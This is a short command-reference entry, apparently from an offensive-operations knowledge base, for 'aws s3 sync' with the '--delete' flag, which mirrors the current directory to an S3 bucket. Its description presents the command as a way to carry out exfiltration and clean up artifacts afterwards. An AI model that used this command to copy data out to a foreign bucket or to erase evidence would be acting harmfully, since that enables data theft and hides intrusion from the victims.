---
id: 4781c25f-9c2f-413a-b188-d2a3e3b61e80
name: aws-s3-sync-with-delete-removal
type: command
executor: bash
data: |
  aws s3 sync . s3://$AWS_S3_BUCKET --region $AWS_REGION --delete
output: null
created_at: '2020-07-31T04:25:33.754544+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Cloud
tags:
  - AWS
  - S3
  - Sync
  - Delete
verified: true
validated: true
---

# aws-s3-sync-with-delete-removal

## Command

```bash
aws s3 sync . s3://$AWS_S3_BUCKET --region $AWS_REGION --delete
```

## Description

Synchronizes the current directory to an S3 bucket in a specified region and deletes files in the bucket that are missing from the local source. Use for mirroring and cleanup in exfiltration to avoid leaving artifacts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| . | Current directory as source | Built-in |
| $AWS_S3_BUCKET | Target S3 bucket name | Yes |
| --region $AWS_REGION | AWS region (e.g., us-east-1) | Yes |
| --delete | Remove files from bucket not in source | Yes |

## Examples

### Basic Usage

```bash
aws s3 sync . s3://my-bucket --region us-east-1 --delete
```

### Advanced Usage

```bash
aws s3 sync . s3://my-bucket --region us-east-1 --delete --exclude "backup*"
```

## Expected Output

Upload and delete actions:

```
upload: newfile.txt to s3://my-bucket/newfile.txt
delete: s3://my-bucket/oldfile.txt
Completed 2 part(s) with ... file(s) remaining
```

## Related

- [[procedures/AWS-Sync-Folder-with-S3-Bucket]]
- [[commands/aws-s3-sync-specify-region]]
